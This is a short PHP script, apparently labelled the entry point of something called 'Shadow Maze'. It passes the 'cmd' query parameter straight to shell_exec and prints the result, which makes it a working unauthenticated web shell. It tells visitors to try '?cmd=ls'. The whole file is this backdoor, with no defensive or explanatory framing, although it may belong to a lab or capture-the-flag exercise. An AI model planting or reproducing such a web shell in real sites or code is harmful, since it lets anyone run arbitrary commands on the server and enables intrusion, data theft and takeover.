<?php

if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo "Shadow Maze entrypoint. Use ?cmd=ls";
}
